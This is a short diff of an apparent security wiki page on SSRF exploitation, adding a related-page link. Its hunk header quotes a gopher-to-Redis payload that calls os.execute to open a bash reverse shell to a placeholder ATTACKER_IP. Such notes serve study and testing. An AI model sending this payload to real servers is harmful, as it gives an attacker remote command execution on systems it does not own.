@@ -56,6 +56,7 @@ gopher://redis:6379/_EVAL "os.execute('/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT
 - Stateless HTTP clients: Multiple requests must preserve state or write atomically.
 
 ## Related Pages
+- [[blind-ssrf-gopher-redis-rce-vs-fastcgi-ssrf-exploitation]]
 - [[web-and-bug-bounty]]
 - [[performance monitor]]
 - [[fastcgi-ssrf-exploitation]]
